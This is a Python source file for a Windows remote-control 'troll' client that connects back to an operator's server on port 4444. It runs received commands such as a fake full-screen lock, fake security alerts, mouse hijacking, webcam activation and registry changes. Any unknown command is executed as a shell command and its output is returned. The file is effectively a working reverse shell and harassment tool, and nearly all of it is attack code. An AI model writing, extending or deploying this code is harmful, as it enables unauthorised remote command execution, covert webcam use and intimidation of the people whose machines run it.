import socket
import subprocess
import struct
import ctypes
import random
import time
import threading
import pygame
import winsound
import tkinter as tk
import pyautogui
from plyer import notification
import cv2
import os
import pyttsx3
import win32gui

SERVER = ""
PORT = 4444

s = socket.socket()
s.connect((SERVER, PORT))
s.recv(1024).decode(errors="ignore")

def beep(duration=1000):
    def run():
        frequency = random.randint(500, 5000)
        winsound.Beep(frequency, duration)
    threading.Thread(target=run, daemon=True).start()

def crazy_mouse(duration=15000):
    def run():
        for _ in range(duration // 1000):
            ctypes.windll.user32.SetCursorPos(random.randint(0, 1920), random.randint(0, 1080))
            time.sleep(1)
    threading.Thread(target=run, daemon=True).start()

def fake_message(message="FATAL ERROR !"):
    def run():
        pygame.init()
        width, height = 500, 300
        screen = pygame.display.set_mode((width, height), pygame.NOFRAME)  
        white = (255, 255, 255)
        red = (255, 0, 0)
        black = (0, 0, 0)
        font = pygame.font.SysFont("Arial", 50, bold=True)
        cross_font = pygame.font.SysFont("Arial", 25, bold=True)
        text = font.render(message, True, red)
        text_rect = text.get_rect(center=(width//2, height//2))
        cross_size = 30
        cross_rect = pygame.Rect(width - cross_size - 10, 10, cross_size, cross_size)
        running = True
        while running:
            screen.fill(white)
            screen.blit(text, text_rect)
            pygame.draw.rect(screen, red, cross_rect)
            cross_text = cross_font.render("X", True, white)
            cross_text_rect = cross_text.get_rect(center=cross_rect.center)
            screen.blit(cross_text, cross_text_rect)
            pygame.display.update()
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False
                if event.type == pygame.MOUSEBUTTONDOWN:
                    if cross_rect.collidepoint(event.pos):
                        running = False
        pygame.quit()
    threading.Thread(target=run, daemon=True).start()

def fake_screen_lock(duration=15000):
    def run():
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.configure(bg='black')
        root.attributes('-topmost', True)
        messages = ["YOU CAN'T ESCAPE", "WHO'S WATCHING?", "ERROR: UNKNOWN USER", "SYSTEM BREACH"]
        label = tk.Label(root, text=random.choice(messages), font=("Arial", 50), fg="white", bg="black")
        label.pack(expand=True)
        def update_text():
            while True:
                time.sleep(random.randint(2, 5))
                label.config(text=random.choice(messages))
        threading.Thread(target=update_text, daemon=True).start()
        def close_after_delay():
            time.sleep(duration / 1000)
            root.destroy()
        threading.Thread(target=close_after_delay, daemon=True).start()
        root.mainloop()
    threading.Thread(target=run, daemon=True).start()

def keyboard_led_flicker(duration=15000):
    def run():
        for _ in range(duration // 1000):
            ctypes.windll.user32.keybd_event(0x14, 0, 0, 0)
            time.sleep(0.5)
            ctypes.windll.user32.keybd_event(0x14, 0, 2, 0)
    threading.Thread(target=run, daemon=True).start()

def random_error_sounds(count=5):
    def run():
        error_sounds = [winsound.MB_ICONHAND, winsound.MB_ICONEXCLAMATION, winsound.MB_ICONASTERISK]
        for _ in range(count):
            winsound.MessageBeep(random.choice(error_sounds))
            time.sleep(random.uniform(0.2, 1.5))
    threading.Thread(target=run, daemon=True).start()

def shaky_mouse(duration=10000):
    def run():
        for _ in range(duration // 100):
            x, y = pyautogui.position()
            pyautogui.moveTo(x + random.randint(-10, 10), y + random.randint(-10, 10), duration=0.05)
            time.sleep(0.1)
    threading.Thread(target=run, daemon=True).start()

def screen_flashing(duration=5):
    def run():
        for _ in range(duration):
            ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:\\Windows\\Web\\Screen\\img100.jpg", 3)
            time.sleep(0.3)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:\\Windows\\Web\\Screen\\img101.jpg", 3)
            time.sleep(0.3)
    threading.Thread(target=run, daemon=True).start()

def on_off_screen():
    def run():
        ctypes.windll.user32.SendMessageW(65535, 274, 61808, 2)
        time.sleep(5)
        ctypes.windll.user32.SendMessageW(65535, 274, 61808, -1)
    threading.Thread(target=run, daemon=True).start()

def open_cd():
    def run():
        try:
            ctypes.windll.WINMM.mciSendStringW("set cdaudio door open", None, 0, None)
            time.sleep(2)
            ctypes.windll.WINMM.mciSendStringW("set cdaudio door closed", None, 0, None)
        except Exception as e:
            return f"[-] Error: {e}"
    threading.Thread(target=run, daemon=True).start()

def fake_notification(message="System alert: an unknown error has occurred!"):
    def run():
        notification.notify(
            title="Windows Security",
            message=message,
            app_icon=None,
            timeout=5
        )
    threading.Thread(target=run, daemon=True).start()

def webcam_led_flash(duration=3):
    def run():
        cap = cv2.VideoCapture(0)
        time.sleep(duration)
        cap.release()
    threading.Thread(target=run, daemon=True).start()

def robot_voice():
    def run():
        engine = pyttsx3.init()
        engine.setProperty('rate', 100)
        engine.setProperty('volume', 1.0) 
        texts = [
            "Fuck You",
            "Fuck You"
        ]
        for text in texts:
            engine.say(text)
            engine.runAndWait()
            time.sleep(2)
    threading.Thread(target=run, daemon=True).start()

def open_notepad_and_troll(message="HELLO WORLD"):
    def run():
        subprocess.Popen(["notepad.exe"])
        time.sleep(2) 
        pyautogui.write(message, interval=0.1)
    threading.Thread(target=run, daemon=True).start()

def set_windows_theme(mode="dark"):
    if mode.lower() == "dark":
        os.system('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize" /v AppsUseLightTheme /t REG_DWORD /d 0 /f')
        os.system('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize" /v SystemUsesLightTheme /t REG_DWORD /d 0 /f')
    elif mode.lower() == "light":
        os.system('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize" /v AppsUseLightTheme /t REG_DWORD /d 1 /f')
        os.system('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize" /v SystemUsesLightTheme /t REG_DWORD /d 1 /f')

def shake_all_windows(times=10):
    def run():
        hwnd_list = []
        def enum_handler(hwnd, _):
            if win32gui.IsWindowVisible(hwnd):
                hwnd_list.append(hwnd)
        win32gui.EnumWindows(enum_handler, None)
        original_positions = {}
        for hwnd in hwnd_list:
            rect = win32gui.GetWindowRect(hwnd)
            x, y, w, h = rect[0], rect[1], rect[2] - rect[0], rect[3] - rect[1]
            original_positions[hwnd] = (x, y, w, h)
        for _ in range(times):
            for hwnd in hwnd_list:
                if win32gui.IsWindow(hwnd):
                    x, y, w, h = original_positions[hwnd]
                    win32gui.MoveWindow(hwnd, x + random.randint(-10, 10), y + random.randint(-10, 10), w, h, True)
            time.sleep(0.1)
        for hwnd in hwnd_list:
            if win32gui.IsWindow(hwnd):
                x, y, w, h = original_positions[hwnd]
                win32gui.MoveWindow(hwnd, x, y, w, h, True)
    threading.Thread(target=run, daemon=True).start()

def flip_screen(duration=5):
    def run():
        for _ in range(duration * 5):
            pyautogui.hotkey('ctrl', 'alt', 'down')
            time.sleep(0.5)
            pyautogui.hotkey('ctrl', 'alt', 'up')
            time.sleep(0.5)
    threading.Thread(target=run, daemon=True).start()

COMMANDS = {
    "msgbox": lambda args: fake_message(" ".join(args)),
    "beep": lambda args: beep(int(args[0]) * 1000) if args else beep(),
    "mouse": lambda args: crazy_mouse(int(args[0]) * 1000) if args else crazy_mouse(),
    "screenlock": lambda args: fake_screen_lock(int(args[0]) * 1000) if args else fake_screen_lock(),
    "led": lambda args: keyboard_led_flicker(int(args[0]) * 1000) if args else keyboard_led_flicker(),
    "errorsound": lambda args: random_error_sounds(int(args[0])) if args else random_error_sounds(),
    "shakymouse": lambda args: shaky_mouse(int(args[0]) * 1000) if args else shaky_mouse(),
    "background": lambda args: screen_flashing(int(args[0])) if args else screen_flashing(),
    "flash": lambda args: on_off_screen(),
    "opencd": lambda args: open_cd(),
    "notification": lambda args: fake_notification(" ".join(args)) if args else fake_notification(),
    "webcam": lambda args: webcam_led_flash(int(args[0])) if args else webcam_led_flash(),
    "robot": lambda args: robot_voice(),
    "notepad": lambda args: open_notepad_and_troll(" ".join(args)),
    "theme": lambda args: set_windows_theme(args[0]) if args else set_windows_theme(),
    "shake": lambda args: shake_all_windows(int(args[0])) if args else shake_all_windows(),
    "flip": lambda args: flip_screen(int(args[0]) if args else 5),
}

while True:
    try:
        cmd = s.recv(1024).decode(errors="ignore").strip()
        print(f'[+] Received command: {cmd}')
        parts = cmd.split(" ")
        command, args = parts[0], parts[1:]
        if command.lower() in ['q', 'quit', 'exit']:
            break
        if command in COMMANDS:
            COMMANDS[command](args)
            result = "\033[0;97m[+] Command executed successfully"
        else:
            try:
                result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True).decode(errors="ignore")
            except Exception as e:
                result = str(e)
        s.send(struct.pack(">I", len(result.encode())))
        s.sendall(result.encode())
    except ConnectionResetError:
        print("[!] Connection lost. Waiting to reconnect...")
        time.sleep(5)
        break  
s.close()
